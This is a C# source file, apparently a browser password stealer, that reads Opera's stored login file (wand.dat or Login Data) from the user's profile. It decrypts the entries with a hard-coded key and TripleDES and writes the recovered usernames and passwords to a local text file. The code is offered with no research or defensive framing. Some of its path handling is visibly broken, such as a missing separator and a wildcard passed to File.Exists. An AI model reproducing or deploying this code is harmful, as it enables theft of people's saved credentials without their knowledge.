using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class OperaDecrypt
{
    public static byte[] Bt = { 0x83, 0x7D, 0xFC, 0x0F, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };
    public static string Path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"Opera Software\Opera Stable";
    public static string DecOpera = @"Opera.txt";
    public static void Getpass()
    {
        if (File.Exists(DecOpera))
        {
            File.Delete(DecOpera);
        }
        if (File.Exists(Path + @"\Login Data.*"))
        {
            Path += @"\Opera Software\Opera Stable\Login Data.*";
            FindBlocks();
        }
        else if (File.Exists(Path + @"\Opera\Opera\profile\wand.dat"))
        {
            Path += @"\Opera\Opera\profile\wand.dat";
            FindBlocks();
        }
    }

    public static void FindBlocks()
    {
        var w = File.CreateText(DecOpera);
        try
        {
            var t = new List<string>();
            var wand = File.ReadAllBytes(Path);
            for (var i = 0; i < wand.Length - 4; i++)
            {
                if (wand[i] != 0x00 || wand[i + 1] != 0x00 || wand[i + 2] != 0x00 || wand[i + 3] != 0x08)
                    continue;
                var blockSize = (int)wand[i + 15];
                var key = new byte[8];
                var ed = new byte[blockSize];
                Array.Copy(wand, i + 4, key, 0, key.Length);
                Array.Copy(wand, i + 16, ed, 0, ed.Length);

                t.Add(Decrypt2Method(key, ed));

                i += 11 + blockSize;
            }
            foreach (var line in t)
            {
                w.WriteLine(line);
                w.Flush();
            }
        }
        catch { }
        w.Close();
    }
    public static string Decrypt2Method(byte[] key, byte[] encryptData)
    {
        try
        {
            var md5 = new MD5CryptoServiceProvider();
            md5.Initialize();
            var tmbyff = new byte[Bt.Length + key.Length];
            Array.Copy(Bt, tmbyff, Bt.Length);
            Array.Copy(key, 0, tmbyff, Bt.Length, key.Length);
            var hash1 = md5.ComputeHash(tmbyff);
            tmbyff = new byte[hash1.Length + Bt.Length + key.Length];
            Array.Copy(hash1, tmbyff, hash1.Length);
            Array.Copy(Bt, 0, tmbyff, hash1.Length, Bt.Length);
            Array.Copy(key, 0, tmbyff, hash1.Length + Bt.Length, key.Length);
            var hash2 = md5.ComputeHash(tmbyff);
            var tdd = new TripleDESCryptoServiceProvider { Mode = CipherMode.CBC, Padding = PaddingMode.None };
            var tpk = new byte[24];
            var IV = new byte[8];
            Array.Copy(hash1, tpk, hash1.Length);
            Array.Copy(hash2, 0, tpk, hash1.Length, 8);
            Array.Copy(hash2, 8, IV, 0, 8);
            tdd.Key = tpk;
            tdd.IV = IV;
            var decryter = tdd.CreateDecryptor();
            var output = decryter.TransformFinalBlock(encryptData, 0, encryptData.Length);
            var enc = Encoding.Unicode.GetString(output);
            return enc;
        }
        catch
        {
            return "";
        }
    }
}